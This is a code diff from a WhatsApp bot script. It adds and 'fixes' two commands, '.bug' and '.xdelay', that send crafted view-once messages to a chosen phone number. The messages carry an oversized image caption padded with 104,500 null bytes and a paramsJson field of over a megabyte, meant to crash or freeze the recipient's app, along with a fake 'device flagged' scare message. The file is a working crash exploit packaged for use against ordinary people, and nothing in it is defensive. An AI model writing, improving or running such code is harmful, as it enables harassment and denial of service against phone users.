@@ -16,14 +16,14 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== ORIGINAL .bug FUNCTION (view‑once product crash) ====================
+// ==================== ORIGINAL .bug FUNCTION ====================
 async function ttaas(conn, target) {
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
         fileLength: "93217",
-        caption: "7eppsynC",
+        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
         height: 1080,
         width: 1080,
         mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
@@ -60,11 +60,11 @@ async function ttaas(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// ==================== NEW .xdelay FUNCTION (hard delay + scary message) ====================
+// ==================== .xdelay FUNCTION (FIXED – DIRECT SEND) ====================
 async function Xdelay(conn, target) {
     const VariabelJid = "0@s.whatsapp.net";
     const scaryMessage = "⚠️ YOUR DEVICE HAS BEEN FLAGGED ⚠️\n\nSystem will now enter deep freeze mode...\n\n🔒 LOCKING INTERFACE 🔒\n\n" + "█".repeat(100);
-    
+
     const imageMsg = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
@@ -77,11 +77,11 @@ async function Xdelay(conn, target) {
         directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
         mediaKeyTimestamp: "1755254367",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyy4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQEAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgETHERQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAREgABASMP/aAAgBAwEBPwCz5LGdFYN//9k=",
-        caption: scaryMessage + "\u0000".repeat(104500)  // hidden scare text + null bytes
+        caption: scaryMessage + "\u0000".repeat(104500)
     };
 
     // First payload: album message with massive image
-    let msg = generateWAMessageFromContent(target, {
+    const albumMsg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
                 albumMessage: {
@@ -102,20 +102,17 @@ async function Xdelay(conn, target) {
             }
         }
     }, {});
-    
-    await conn.relayMessage(target, {
-        groupStatusMessageV2: { message: msg.message }
-    }, { messageId: msg.key.id, participant: { jid: target } });
+    await conn.relayMessage(target, albumMsg.message, {});
 
-    // Second payload: interactive response with massive paramsJson (hard delay)
-    const payload = generateWAMessageFromContent(target, {
+    // Second payload: interactive response with 1MB+ paramsJson (hard delay)
+    const interactiveMsg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
                 interactiveResponseMessage: {
                     body: { text: "𝗫 - 𝗭 𝗢 R 𝗢", format: "DEFAULT" },
                     nativeFlowResponseMessage: {
                         name: "address_message",
-                        paramsJson: "\x10".repeat(1045000),  // 1MB+ of raw data
+                        paramsJson: "\x10".repeat(1045000),
                         version: 3
                     },
                     entryPointConversionSource: "call_permission_request"
@@ -129,15 +126,12 @@ async function Xdelay(conn, target) {
         font: Math.floor(Math.random() * 99999999),
         background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
     });
-    
-    await conn.relayMessage(target, {
-        groupStatusMessageV2: { message: payload.message }
-    }, { messageId: payload.key.id, participant: { jid: target } });
+    await conn.relayMessage(target, interactiveMsg.message, {});
 }
 
 // ==================== COMMANDS ====================
 
-// Only .bug (original view‑once crash)
+// .bug – original view‑once product crash
 cmd({
     pattern: "bug",
     desc: "ViewOnce product crash (original)",
@@ -151,7 +145,7 @@ cmd({
     await reply(`✅ VIEWONCE CRASH SENT to ${target}`);
 });
 
-// New .xdelay command (hard delay + scary message)
+// .xdelay – hard delay + scary message (fully fixed)
 cmd({
     pattern: "xdelay",
     desc: "Hard delay crash with scary system message",
